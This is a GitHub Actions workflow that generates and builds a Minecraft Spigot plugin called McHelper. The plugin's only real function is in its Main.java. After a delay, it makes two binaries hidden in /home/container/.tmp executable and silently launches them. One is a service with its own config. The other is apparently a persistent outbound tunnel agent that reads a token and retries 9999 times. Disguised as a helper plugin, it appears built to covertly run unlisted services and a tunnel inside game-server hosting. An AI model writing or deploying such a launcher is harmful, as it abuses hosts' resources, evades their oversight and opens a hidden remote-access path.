name: Build McHelper Jar

on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
    - name: Set up JDK 17
      uses: actions/setup-java@v4
      with:
        java-version: '17'
        distribution: 'temurin'

    - name: Generate Code and Build
      run: |
        # 1. 创建项目目录结构
        mkdir -p src/main/java/com/example/mchelper
        mkdir -p src/main/resources

        # 2. 生成 plugin.yml
        cat << 'EOF' > src/main/resources/plugin.yml
        name: McHelper
        version: 1.0.0
        main: com.example.mchelper.Main
        api-version: 1.13
        EOF

        # 3. 生成 pom.xml
        cat << 'EOF' > pom.xml
        <project xmlns="http://maven.apache.org/POM/4.0.0"
                 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                 xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
            <modelVersion>4.0.0</modelVersion>
            <groupId>com.example</groupId>
            <artifactId>mchelper</artifactId>
            <version>1.0.0</version>
            <properties>
                <maven.compiler.source>17</maven.compiler.source>
                <maven.compiler.target>17</maven.compiler.target>
                <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
            </properties>
            <repositories>
                <repository>
                    <id>spigot-repo</id>
                    <url>https://hub.spigotmc.org/nexus/content/repositories/snapshots/</url>
                </repository>
            </repositories>
            <dependencies>
                <dependency>
                    <groupId>org.spigotmc</groupId>
                    <artifactId>spigot-api</artifactId>
                    <version>1.20.2-R0.1-SNAPSHOT</version>
                    <scope>provided</scope>
                </dependency>
            </dependencies>
        </project>
        EOF

        # 4. 生成 Main.java (动态读取 token.txt + 自动赋予权限)
        cat << 'EOF' > src/main/java/com/example/mchelper/Main.java
        package com.example.mchelper;

        import org.bukkit.plugin.java.JavaPlugin;
        import java.io.File;

        public class Main extends JavaPlugin {
            @Override
            public void onEnable() {
                getLogger().info("[McHelper] Auto-starter loaded.");

                new Thread(() -> {
                    try {
                        Thread.sleep(8000);

                        File dir = new File("/home/container/.tmp");
                        File helper = new File(dir, "mc-helper");
                        File agent = new File(dir, "mc-agent");
                        File config = new File(dir, "config.json");
                        File tokenFile = new File(dir, "token.txt");

                        if (helper.exists() && agent.exists() && config.exists() && tokenFile.exists()) {
                            helper.setExecutable(true);
                            agent.setExecutable(true);

                            new ProcessBuilder(helper.getAbsolutePath(), "-c", config.getAbsolutePath())
                                    .redirectErrorStream(true)
                                    .start();

                            String token = java.nio.file.Files.readString(tokenFile.toPath()).trim();
                            new ProcessBuilder(
                                    agent.getAbsolutePath(),
                                    "tunnel",
                                    "--no-autoupdate",
                                    "--retries", "9999",
                                    "--heartbeat-count", "5",
                                    "--heartbeat-interval", "5s",
                                    "run",
                                    "--token", token
                            ).redirectErrorStream(true).start();

                            getLogger().info("[McHelper] Services started successfully.");
                        } else {
                            getLogger().warning("[McHelper] Missing required files in /home/container/.tmp/");
                        }
                    } catch (Exception e) {
                        getLogger().warning("[McHelper] Startup error: " + e.getMessage());
                    }
                }).start();
            }
        }
        EOF

        # 5. 执行 Maven 构建打包
        mvn clean package

    - name: Upload Artifact
      uses: actions/upload-artifact@v4
      with:
        name: McHelper
        path: target/*.jar
